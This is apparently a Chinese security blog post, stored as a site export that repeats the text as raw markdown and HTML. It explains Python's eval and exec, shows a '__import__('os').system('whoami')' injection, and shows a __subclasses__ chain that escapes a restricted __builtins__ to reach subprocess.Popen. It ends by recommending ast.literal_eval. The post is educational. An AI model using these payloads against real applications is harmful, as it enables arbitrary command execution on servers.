python语句上的不同\n\n![7e44ff01dfa10acb22e6ab4528e9c2c9.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181145-a4607d6a-1747-1.png)\n\nExec可以对变量a进行赋值操作\n\n![f799978a115968705906172096fa177f.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181155-aa0a6096-1747-1.png)\n\nEval并不能对变量a进行赋值\n\n![6c0efaabd67276a72f5705b1f887ecec.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181201-ae135dd2-1747-1.png)\n\nExec可以执行python语句”import os”\n\n![2717a5d529969f76d2451dbe47c2feaf.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181212-b47e45a6-1747-1.png)\n\neval不能直接执行python语句”import os”；eval可以执行表达式\"__import__('os')\"并返回计算结果\n\n2、eval与exec在返回值上的不同\n\n![30524f3b1b371deaaab14bc93f07a16f.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181219-b8b8a490-1747-1.png)\n\neval在对表达式进行计算后，返回计算结果\n\n![95efb3985c4719306cb4101924a93ecc.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181226-bca73a30-1747-1.png)\n\nexec并无返回结果\n\n虽然eval与exec存在着种种区别，但是他们都会将传入的第一个参数执行，这将有着潜在的任意代码执行隐患\n\n存在的安全隐患\n--------------\n\n在使用eval和exec时存在的安全隐患是极其相似的，因此下文代码中使用eval进行举例\n\n下图的代码addition方法使用eval对传入参数进行处理\n\n![4081f6061d9b86bd7205c2e80887c016.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181232-c067b0d2-1747-1.png)\n\nAddition方法会将传入的a与b参数拼接\"a+b\"字符串并通过eval计算\n\n当a传入的参数为\"__import__('os').system('whoami')\"时,如下图：\n\n![236478d04c99c592ec3da204a012de7b.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181241-c574aa76-1747-1.png)\n\nEval执行的表达式为\"__import__('os').system('whoami')+2\"\n\n这将执行系统命令”whoami”并最终返回2\n\n这里有一个细节，为什么eval计算结果为2呢？\n\n因为__import__('os').system('whoami')结果为0，如下图\n\n![038dc616d726193296e1173c489ee72b.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181250-caca17c2-1747-1.png)\n\n因此eval最终计算的表达式为\"0+2\"\n\n当然，在实际情况中，可以使用”\\#”将后续内容进行注释，通过传入\"__import__('os').system('whoami')#\"\n\n![8b9f3ca5c6cc74886553832c4c125348.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181304-d39359a4-1747-1.png)\n\n最终eval需要执行的表达式为”__import__('os').system('whoami') # +2”\n\n由于最终相当于执行了\"0 #+2\"，所以返回值为0\n\n防范\n----\n\n从上述案例中可以发现，在通常情况下，只要传递给eval/exec中的变量可控，就存在执行系统命令的问题\n\n针对以上例子 eval(\"__import__('os').system('whoami')\")问题时，存在一种常见的限制方法：即指定 eval 的globals参数为 {'__builtins__': None} 或者 {'__builtins__': {}}这样的形式\n\n上文只是简单的介绍了eval/exec中globals这个参数，接下来详细说明下为什么将eval\n/exec中globals参数设置为 {'__builtins__': None} 或者 {'__builtins__': {}}这样的形式就可以避免任意代码执行的隐患\n\n在eval 与exec中，globals参数用于指定运行时的全局命名空间，如果globals没有被提供，则使用python的全局命名空间。\n\n举个简单的例子如下：\n\n当globals参数没有被提供时，如下图：\n\n![0cc2c1200cb544e417357d5c823b768e.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181314-d94c1ebc-1747-1.png)\n\n当globals参数没有被提供时，eval使用python的全局命名空间。这里的a为1，eval结果为2\n\n![8a7ab13c53c4a723eedcfd3e632cbda6.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181323-de82e32a-1747-1.png)\n\n当globals参数被提供即globals为{‘a’:2}时，这时候eval的作用域就是{‘a’:2}字典所指定，这里的a为1，eval结果为2\n\n当globals被指定时，eval只使用globals参数所提供的字典里的数据，并不使用模块中的全局命名空间，见下图\n\n![e4596dc67fef58c13bbe166b4338ea89.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181334-e54623f2-1747-1.png)\n\n即使我们定义了模块全局命名空间中b变量为2，但在由于eval使用globals参数指定全局命名空间为{'a':2}里没有声明变量b，因此程序报出”name 'b' is not defined”的错误\n\n接下来要介绍一下__builtins__模块\n\n__builtins__模块提供对Python的所有“内建”标识符的直接访问的功能。Python解释器在启动的时候会首先加载内建名称空间并自动导入所对应的内建函数。\n\n由于__builtins__的存在，使得在Python可以直接使用一些内建函数而不用显式的导入它们，例如input()、list()、__import__ 等\n\n加载__builtins__自动导入的内建函数列表如下\n\n![3a0241441ac0df719001167c9e8dbc44.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181342-ea00139e-1747-1.png)\n\n我们可以在python中直接使用上图中的这些内建函数而不需要导入\n\n回到eval/exec问题中：值得注意的是，在eval/exec中，如果globals参数被提供，但是没有提供自定义的__builtins__，那么eval/exec会将当前环境中的__builtins__拷贝到自己提供的globals里，例子见下图：\n\n![ce4db27358b781ed836c3cb95f034f23.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181349-ee3222cc-1747-1.png)\n\n由于没有自定义__builtins__，因此使用当前环境中的__builtins__，而当前环境中的__builtins__的函数列表中存在__import__，因此可以直接使用__import__\n\n但是如果globals参数中使用了自定义的__builtins__，eval/exec则使用globals所指定的__builtins__，例如下图\n\n![d34277f880e9e284d7c0c5ba45e786a6.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181355-f1efd116-1747-1.png)\n\n上图指定globals为{'__builtins__':{'list':list}}，因此在此eval中可以使用list内置函数，但是由于没有指定__import__,所以使用__import__时报错\n\nexec同样如此，如下图\n\n![b527316cebd6de05393fc85535b3dd2a.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181403-f69bdbf6-1747-1.png)\n\n指定globals为{'__builtins__':{'list':list}}，使用__import__时报错\n\n因此可以通过指定globals参数，来控制eval运行执行的内置函数。这个方法看起来很有效的限制eval/exec对__import__等内置函数的使用，似乎可以防止任意代码执行。但是此方法仍然存在绕过\n\n### 绕过\n\n在上述防范中，通过globals参数对__builtins__中的内置函数范围进行限制，使得eval/exec无法随意使用”__import__”等内置函数来达成阻止任意代码执行\n\n但是却存在着如下的绕过：\n\n(1,2).__class__.__bases__[0].__subclasses__()\n\n这里解释一下上面这串代码的含义\n\n\"(1,2)\"是一个元组\n\n![2b2dd82e7180a13bcbc9d82da46e0a76.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181411-fb144b46-1747-1.png)\n\n__class__ 是用来查看对象所在的类\n\n![e4b512c988eb91e3804e9be83916b2fb.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181421-0145fd20-1748-1.png)\n\n很显然”(1,2)”元组对象所对应的类是tuple\n\n__bases__属性返回所有直接父类所组成的元组。\n\n![de3600eaf834593b3910830b1df1badb.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181429-05d7350c-1748-1.png)\n\n如上图可见tuple类的直接父类是object类\n\n__subclasses__用来获取类的所有子类\n\n![5bf3c3b432f1a16189bde5be6bede9a1.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181437-0aad9d28-1748-1.png)\n\n因为(1,2).__class__.__bases__[0]已经是object类了，而object类子类众多，因此可以使用的类就比较丰富了\n\n举个例子，如下图\n\n![df7c89e9eab331f5b72463e22df45617.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181444-0f12e224-1748-1.png)\n\n上图红框中，也就是(1,2).__class__.__bases__[0].__subclasses__()[7],对应的类是list\n\n因此可以通过(1,2).__class__.__bases__[0].__subclasses__()[7]来使用list对数据进行处理，如下图\n\n![bb3656751aa7f58d74f8e7e2c5d2e2aa.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181452-13a7cae8-1748-1.png)\n\n如上图所示，通(1,2).__class__.__bases__\\[0\\].__subclasses__()\\[7\\]((1,2))将元组(1,2)转换成数组\\[1,2\\]\n\n在明白了原理之后可以发现，除了使用(1,2).__class__.__bases__\\[0\\].__subclasses__()\\[7\\]((1,2))之外，还可以使用().__class__.__bases__\\[0\\].__subclasses__()\\[7\\]((1,2))或\\[\\].__class__.__bases__\\[0\\].__subclasses__()\\[7\\]((1,2))或\"\".__class__.__bases__\\[0\\].__bases__\\[0\\].__subclasses__()\\[7\\]((1,2))等等\n\n在上例中，由于str类的直接父类是basestring，basestring的直接父类才是object，而因此上述例子中需要使用\"\".__class__.__bases__\\[0\\].__bases__\\[0\\].__subclasses__()\\[7\\]((1,2))\n\n但构造利用链的核心方法就是：只要追溯到object类并使用__subclasses__()使用object类的子类即可\n\n我们查看下object的子类，找一找有没有能执行系统命令的\n\n![566beed21499be9fc25452623809ebf6.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181506-1c0ac118-1748-1.png)\n\n上图红框里有一个subprocess.Popen，很显然，我们可以通过这个来执行系统命令\n\n利用链如下\n\n().__class__.__bases__\\[0\\].__subclasses__()\\[176\\](“whoami”)\n\n这里的176是subprocess.Popen在object子类列表中的下标值\n\n实际效果如下图\n\n![0440151554898a7d57d225400a6a4b1a.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181513-2044eb1e-1748-1.png)\n\n可见,虽然限制只允许使用list,但是我们仍然可以执行系统命令\n\n因此，简单的使用{'__builtins__': None}是无法满足eval的安全需求的\n\n实际上，可以使用ast.literal_eval()来代替eval()\n\nast.literal_eval()允许传入的内容如下\n\nstrings, bytes, numbers, tuples, lists, dicts, sets, booleans, None\n\n当不合法的字符传入时，程序则会报错，如下图\n\n![e8535ef76cfce3409f43cecc8bea9876.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181521-253fbda6-1748-1.png)\n\n使用ast.literal_eval()代替eval和exec，可以有效的防止任意代码执行漏洞\n\n# 写在最后\n\n由于篇幅有限，这里先介绍第一组，后续文章会介绍其他有潜在安全隐患的函数。","source":"_posts/python-rce-1.md","raw":"---\ntitle: Python中有潜在代码执行风险的函数(一)\ndate: 2019-12-10 17:34:16\ntags: web漏洞分析\ncategorise: 技术\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/timg.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n在Python中一些函数存在着任意代码执行的隐患，错误的使用这些方法将会导致漏洞的产生，攻击者可能会利用这些安全隐患进行攻击。\n\n文中的知识点并非新知识，但我会围绕着基础点比较细致的分析漏洞的成因、防范以及绕过，希望对大家有帮助\n\n<!--more-->\n\n# **第一组**\n\n首先介绍下python中常见的存在任意代码执行隐患的方法：eval与exec\n\n简介\n----\n\n在python中，eval和exec的用法极其相似。eval和exec都可以将传入的字符串执行，但两者又有不同之处：\n\n### eval\n\neval是一个python内置函数，语法为eval(*expression*, *globals=None*,*locals=None*)\n\neval函数接收三个参数：其中 expression\n参数是用做运算的字符串类型表达式；globals参数用于指定运行时的全局命名空间；Locals参数用于指定运行时的局部命名空间。globals与 locals 是可选参数，默认值是 None，他们只在运算时起作用，运算后则销毁。\n\n### exec\n\n在Python2中exec是一个内置语句(statement)而不是一个函数，但是到了Python3中exec将Python2中作为内置语句的exec和execfile()函数功能整合到一起，成为了一个新的函数，语法为exec(*object*[, *globals*[,*locals*]])\n\nexec的第一个参数可以是code object，因此它可以执行复杂的代码逻辑，例如变量赋值操作等，这一点是eval做不到的。但exec返回值永远为 None，因此exec不能像eval一样将计算结果返回。exec的后两个参数与eval一致\n\n关于二者的区别，可以见下面的几组代码\n\n1、eval与exec在执行 python语句上的不同\n\n![7e44ff01dfa10acb22e6ab4528e9c2c9.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181145-a4607d6a-1747-1.png)\n\nExec可以对变量a进行赋值操作\n\n![f799978a115968705906172096fa177f.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181155-aa0a6096-1747-1.png)\n\nEval并不能对变量a进行赋值\n\n![6c0efaabd67276a72f5705b1f887ecec.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181201-ae135dd2-1747-1.png)\n\nExec可以执行python语句”import os”\n\n![2717a5d529969f76d2451dbe47c2feaf.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181212-b47e45a6-1747-1.png)\n\neval不能直接执行python语句”import os”；eval可以执行表达式\"__import__('os')\"并返回计算结果\n\n2、eval与exec在返回值上的不同\n\n![30524f3b1b371deaaab14bc93f07a16f.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181219-b8b8a490-1747-1.png)\n\neval在对表达式进行计算后，返回计算结果\n\n![95efb3985c4719306cb4101924a93ecc.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181226-bca73a30-1747-1.png)\n\nexec并无返回结果\n\n虽然eval与exec存在着种种区别，但是他们都会将传入的第一个参数执行，这将有着潜在的任意代码执行隐患\n\n存在的安全隐患\n--------------\n\n在使用eval和exec时存在的安全隐患是极其相似的，因此下文代码中使用eval进行举例\n\n下图的代码addition方法使用eval对传入参数进行处理\n\n![4081f6061d9b86bd7205c2e80887c016.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181232-c067b0d2-1747-1.png)\n\nAddition方法会将传入的a与b参数拼接\"a+b\"字符串并通过eval计算\n\n当a传入的参数为\"__import__('os').system('whoami')\"时,如下图：\n\n![236478d04c99c592ec3da204a012de7b.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181241-c574aa76-1747-1.png)\n\nEval执行的表达式为\"__import__('os').system('whoami')+2\"\n\n这将执行系统命令”whoami”并最终返回2\n\n这里有一个细节，为什么eval计算结果为2呢？\n\n因为__import__('os').system('whoami')结果为0，如下图\n\n![038dc616d726193296e1173c489ee72b.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181250-caca17c2-1747-1.png)\n\n因此eval最终计算的表达式为\"0+2\"\n\n当然，在实际情况中，可以使用”\\#”将后续内容进行注释，通过传入\"__import__('os').system('whoami')#\"\n\n![8b9f3ca5c6cc74886553832c4c125348.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181304-d39359a4-1747-1.png)\n\n最终eval需要执行的表达式为”__import__('os').system('whoami') # +2”\n\n由于最终相当于执行了\"0 #+2\"，所以返回值为0\n\n防范\n----\n\n从上述案例中可以发现，在通常情况下，只要传递给eval/exec中的变量可控，就存在执行系统命令的问题\n\n针对以上例子 eval(\"__import__('os').system('whoami')\")问题时，存在一种常见的限制方法：即指定 eval 的globals参数为 {'__builtins__': None} 或者 {'__builtins__': {}}这样的形式\n\n上文只是简单的介绍了eval/exec中globals这个参数，接下来详细说明下为什么将eval\n/exec中globals参数设置为 {'__builtins__': None} 或者 {'__builtins__': {}}这样的形式就可以避免任意代码执行的隐患\n\n在eval 与exec中，globals参数用于指定运行时的全局命名空间，如果globals没有被提供，则使用python的全局命名空间。\n\n举个简单的例子如下：\n\n当globals参数没有被提供时，如下图：\n\n![0cc2c1200cb544e417357d5c823b768e.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181314-d94c1ebc-1747-1.png)\n\n当globals参数没有被提供时，eval使用python的全局命名空间。这里的a为1，eval结果为2\n\n![8a7ab13c53c4a723eedcfd3e632cbda6.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181323-de82e32a-1747-1.png)\n\n当globals参数被提供即globals为{‘a’:2}时，这时候eval的作用域就是{‘a’:2}字典所指定，这里的a为1，eval结果为2\n\n当globals被指定时，eval只使用globals参数所提供的字典里的数据，并不使用模块中的全局命名空间，见下图\n\n![e4596dc67fef58c13bbe166b4338ea89.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181334-e54623f2-1747-1.png)\n\n即使我们定义了模块全局命名空间中b变量为2，但在由于eval使用globals参数指定全局命名空间为{'a':2}里没有声明变量b，因此程序报出”name 'b' is not defined”的错误\n\n接下来要介绍一下__builtins__模块\n\n__builtins__模块提供对Python的所有“内建”标识符的直接访问的功能。Python解释器在启动的时候会首先加载内建名称空间并自动导入所对应的内建函数。\n\n由于__builtins__的存在，使得在Python可以直接使用一些内建函数而不用显式的导入它们，例如input()、list()、__import__ 等\n\n加载__builtins__自动导入的内建函数列表如下\n\n![3a0241441ac0df719001167c9e8dbc44.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181342-ea00139e-1747-1.png)\n\n我们可以在python中直接使用上图中的这些内建函数而不需要导入\n\n回到eval/exec问题中：值得注意的是，在eval/exec中，如果globals参数被提供，但是没有提供自定义的__builtins__，那么eval/exec会将当前环境中的__builtins__拷贝到自己提供的globals里，例子见下图：\n\n![ce4db27358b781ed836c3cb95f034f23.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181349-ee3222cc-1747-1.png)\n\n由于没有自定义__builtins__，因此使用当前环境中的__builtins__，而当前环境中的__builtins__的函数列表中存在__import__，因此可以直接使用__import__\n\n但是如果globals参数中使用了自定义的__builtins__，eval/exec则使用globals所指定的__builtins__，例如下图\n\n![d34277f880e9e284d7c0c5ba45e786a6.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181355-f1efd116-1747-1.png)\n\n上图指定globals为{'__builtins__':{'list':list}}，因此在此eval中可以使用list内置函数，但是由于没有指定__import__,所以使用__import__时报错\n\nexec同样如此，如下图\n\n![b527316cebd6de05393fc85535b3dd2a.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181403-f69bdbf6-1747-1.png)\n\n指定globals为{'__builtins__':{'list':list}}，使用__import__时报错\n\n因此可以通过指定globals参数，来控制eval运行执行的内置函数。这个方法看起来很有效的限制eval/exec对__import__等内置函数的使用，似乎可以防止任意代码执行。但是此方法仍然存在绕过\n\n### 绕过\n\n在上述防范中，通过globals参数对__builtins__中的内置函数范围进行限制，使得eval/exec无法随意使用”__import__”等内置函数来达成阻止任意代码执行\n\n但是却存在着如下的绕过：\n\n(1,2).__class__.__bases__[0].__subclasses__()\n\n这里解释一下上面这串代码的含义\n\n\"(1,2)\"是一个元组\n\n![2b2dd82e7180a13bcbc9d82da46e0a76.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181411-fb144b46-1747-1.png)\n\n__class__ 是用来查看对象所在的类\n\n![e4b512c988eb91e3804e9be83916b2fb.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181421-0145fd20-1748-1.png)\n\n很显然”(1,2)”元组对象所对应的类是tuple\n\n__bases__属性返回所有直接父类所组成的元组。\n\n![de3600eaf834593b3910830b1df1badb.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181429-05d7350c-1748-1.png)\n\n如上图可见tuple类的直接父类是object类\n\n__subclasses__用来获取类的所有子类\n\n![5bf3c3b432f1a16189bde5be6bede9a1.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181437-0aad9d28-1748-1.png)\n\n因为(1,2).__class__.__bases__[0]已经是object类了，而object类子类众多，因此可以使用的类就比较丰富了\n\n举个例子，如下图\n\n![df7c89e9eab331f5b72463e22df45617.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181444-0f12e224-1748-1.png)\n\n上图红框中，也就是(1,2).__class__.__bases__[0].__subclasses__()[7],对应的类是list\n\n因此可以通过(1,2).__class__.__bases__[0].__subclasses__()[7]来使用list对数据进行处理，如下图\n\n![bb3656751aa7f58d74f8e7e2c5d2e2aa.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181452-13a7cae8-1748-1.png)\n\n如上图所示，通(1,2).__class__.__bases__\\[0\\].__subclasses__()\\[7\\]((1,2))将元组(1,2)转换成数组\\[1,2\\]\n\n在明白了原理之后可以发现，除了使用(1,2).__class__.__bases__\\[0\\].__subclasses__()\\[7\\]((1,2))之外，还可以使用().__class__.__bases__\\[0\\].__subclasses__()\\[7\\]((1,2))或\\[\\].__class__.__bases__\\[0\\].__subclasses__()\\[7\\]((1,2))或\"\".__class__.__bases__\\[0\\].__bases__\\[0\\].__subclasses__()\\[7\\]((1,2))等等\n\n在上例中，由于str类的直接父类是basestring，basestring的直接父类才是object，而因此上述例子中需要使用\"\".__class__.__bases__\\[0\\].__bases__\\[0\\].__subclasses__()\\[7\\]((1,2))\n\n但构造利用链的核心方法就是：只要追溯到object类并使用__subclasses__()使用object类的子类即可\n\n我们查看下object的子类，找一找有没有能执行系统命令的\n\n![566beed21499be9fc25452623809ebf6.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181506-1c0ac118-1748-1.png)\n\n上图红框里有一个subprocess.Popen，很显然，我们可以通过这个来执行系统命令\n\n利用链如下\n\n().__class__.__bases__\\[0\\].__subclasses__()\\[176\\](“whoami”)\n\n这里的176是subprocess.Popen在object子类列表中的下标值\n\n实际效果如下图\n\n![0440151554898a7d57d225400a6a4b1a.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181513-2044eb1e-1748-1.png)\n\n可见,虽然限制只允许使用list,但是我们仍然可以执行系统命令\n\n因此，简单的使用{'__builtins__': None}是无法满足eval的安全需求的\n\n实际上，可以使用ast.literal_eval()来代替eval()\n\nast.literal_eval()允许传入的内容如下\n\nstrings, bytes, numbers, tuples, lists, dicts, sets, booleans, None\n\n当不合法的字符传入时，程序则会报错，如下图\n\n![e8535ef76cfce3409f43cecc8bea9876.png](https://xzfile.aliyuncs.com/media/upload/picture/20191205181521-253fbda6-1748-1.png)\n\n使用ast.literal_eval()代替eval和exec，可以有效的防止任意代码执行漏洞\n\n# 写在最后\n\n由于篇幅有限，这里先介绍第一组，后续文章会介绍其他有潜在安全隐患的函数。","slug":"python-rce-1","published":1,"updated":"2020-10-28T01:26:54.927Z","_id":"ckgrozu9u004bwsa9256bcp4t","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在Python中一些函数存在着任意代码执行的隐患，错误的使用这些方法将会导致漏洞的产生，攻击者可能会利用这些安全隐患进行攻击。</p>\n<p>文中的知识点并非新知识，但我会围绕着基础点比较细致的分析漏洞的成因、防范以及绕过，希望对大家有帮助</p>\n<a id=\"more\"></a>\n\n<h1 id=\"第一组\"><a href=\"#第一组\" class=\"headerlink\" title=\"第一组\"></a><strong>第一组</strong></h1><p>首先介绍下python中常见的存在任意代码执行隐患的方法：eval与exec</p>\n<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>在python中，eval和exec的用法极其相似。eval和exec都可以将传入的字符串执行，但两者又有不同之处：</p>\n<h3 id=\"eval\"><a href=\"#eval\" class=\"headerlink\" title=\"eval\"></a>eval</h3><p>eval是一个python内置函数，语法为eval(<em>expression</em>, <em>globals=None</em>,<em>locals=None</em>)</p>\n<p>eval函数接收三个参数：其中 expression<br>参数是用做运算的字符串类型表达式；globals参数用于指定运行时的全局命名空间；Locals参数用于指定运行时的局部命名空间。globals与 locals 是可选参数，默认值是 None，他们只在运算时起作用，运算后则销毁。</p>\n<h3 id=\"exec\"><a href=\"#exec\" class=\"headerlink\" title=\"exec\"></a>exec</h3><p>在Python2中exec是一个内置语句(statement)而不是一个函数，但是到了Python3中exec将Python2中作为内置语句的exec和execfile()函数功能整合到一起，成为了一个新的函数，语法为exec(<em>object</em>[, <em>globals</em>[,<em>locals</em>]])</p>\n<p>exec的第一个参数可以是code object，因此它可以执行复杂的代码逻辑，例如变量赋值操作等，这一点是eval做不到的。但exec返回值永远为 None，因此exec不能像eval一样将计算结果返回。exec的后两个参数与eval一致</p>\n<p>关于二者的区别，可以见下面的几组代码</p>\n<p>1、eval与exec在执行 python语句上的不同</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181145-a4607d6a-1747-1.png\" alt=\"7e44ff01dfa10acb22e6ab4528e9c2c9.png\"></p>\n<p>Exec可以对变量a进行赋值操作</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181155-aa0a6096-1747-1.png\" alt=\"f799978a115968705906172096fa177f.png\"></p>\n<p>Eval并不能对变量a进行赋值</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181201-ae135dd2-1747-1.png\" alt=\"6c0efaabd67276a72f5705b1f887ecec.png\"></p>\n<p>Exec可以执行python语句”import os”</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181212-b47e45a6-1747-1.png\" alt=\"2717a5d529969f76d2451dbe47c2feaf.png\"></p>\n<p>eval不能直接执行python语句”import os”；eval可以执行表达式”<strong>import</strong>(‘os’)”并返回计算结果</p>\n<p>2、eval与exec在返回值上的不同</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181219-b8b8a490-1747-1.png\" alt=\"30524f3b1b371deaaab14bc93f07a16f.png\"></p>\n<p>eval在对表达式进行计算后，返回计算结果</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181226-bca73a30-1747-1.png\" alt=\"95efb3985c4719306cb4101924a93ecc.png\"></p>\n<p>exec并无返回结果</p>\n<p>虽然eval与exec存在着种种区别，但是他们都会将传入的第一个参数执行，这将有着潜在的任意代码执行隐患</p>\n<h2 id=\"存在的安全隐患\"><a href=\"#存在的安全隐患\" class=\"headerlink\" title=\"存在的安全隐患\"></a>存在的安全隐患</h2><p>在使用eval和exec时存在的安全隐患是极其相似的，因此下文代码中使用eval进行举例</p>\n<p>下图的代码addition方法使用eval对传入参数进行处理</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181232-c067b0d2-1747-1.png\" alt=\"4081f6061d9b86bd7205c2e80887c016.png\"></p>\n<p>Addition方法会将传入的a与b参数拼接”a+b”字符串并通过eval计算</p>\n<p>当a传入的参数为”<strong>import</strong>(‘os’).system(‘whoami’)”时,如下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181241-c574aa76-1747-1.png\" alt=\"236478d04c99c592ec3da204a012de7b.png\"></p>\n<p>Eval执行的表达式为”<strong>import</strong>(‘os’).system(‘whoami’)+2”</p>\n<p>这将执行系统命令”whoami”并最终返回2</p>\n<p>这里有一个细节，为什么eval计算结果为2呢？</p>\n<p>因为<strong>import</strong>(‘os’).system(‘whoami’)结果为0，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181250-caca17c2-1747-1.png\" alt=\"038dc616d726193296e1173c489ee72b.png\"></p>\n<p>因此eval最终计算的表达式为”0+2”</p>\n<p>当然，在实际情况中，可以使用”#”将后续内容进行注释，通过传入”<strong>import</strong>(‘os’).system(‘whoami’)#”</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181304-d39359a4-1747-1.png\" alt=\"8b9f3ca5c6cc74886553832c4c125348.png\"></p>\n<p>最终eval需要执行的表达式为”<strong>import</strong>(‘os’).system(‘whoami’) # +2”</p>\n<p>由于最终相当于执行了”0 #+2”，所以返回值为0</p>\n<h2 id=\"防范\"><a href=\"#防范\" class=\"headerlink\" title=\"防范\"></a>防范</h2><p>从上述案例中可以发现，在通常情况下，只要传递给eval/exec中的变量可控，就存在执行系统命令的问题</p>\n<p>针对以上例子 eval(“<strong>import</strong>(‘os’).system(‘whoami’)”)问题时，存在一种常见的限制方法：即指定 eval 的globals参数为 {‘<strong>builtins</strong>‘: None} 或者 {‘<strong>builtins</strong>‘: {}}这样的形式</p>\n<p>上文只是简单的介绍了eval/exec中globals这个参数，接下来详细说明下为什么将eval<br>/exec中globals参数设置为 {‘<strong>builtins</strong>‘: None} 或者 {‘<strong>builtins</strong>‘: {}}这样的形式就可以避免任意代码执行的隐患</p>\n<p>在eval 与exec中，globals参数用于指定运行时的全局命名空间，如果globals没有被提供，则使用python的全局命名空间。</p>\n<p>举个简单的例子如下：</p>\n<p>当globals参数没有被提供时，如下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181314-d94c1ebc-1747-1.png\" alt=\"0cc2c1200cb544e417357d5c823b768e.png\"></p>\n<p>当globals参数没有被提供时，eval使用python的全局命名空间。这里的a为1，eval结果为2</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181323-de82e32a-1747-1.png\" alt=\"8a7ab13c53c4a723eedcfd3e632cbda6.png\"></p>\n<p>当globals参数被提供即globals为{‘a’:2}时，这时候eval的作用域就是{‘a’:2}字典所指定，这里的a为1，eval结果为2</p>\n<p>当globals被指定时，eval只使用globals参数所提供的字典里的数据，并不使用模块中的全局命名空间，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181334-e54623f2-1747-1.png\" alt=\"e4596dc67fef58c13bbe166b4338ea89.png\"></p>\n<p>即使我们定义了模块全局命名空间中b变量为2，但在由于eval使用globals参数指定全局命名空间为{‘a’:2}里没有声明变量b，因此程序报出”name ‘b’ is not defined”的错误</p>\n<p>接下来要介绍一下__builtins__模块</p>\n<p>__builtins__模块提供对Python的所有“内建”标识符的直接访问的功能。Python解释器在启动的时候会首先加载内建名称空间并自动导入所对应的内建函数。</p>\n<p>由于<strong>builtins__的存在，使得在Python可以直接使用一些内建函数而不用显式的导入它们，例如input()、list()、__import</strong> 等</p>\n<p>加载__builtins__自动导入的内建函数列表如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20191205181342-ea00139e-1747-1.png\" 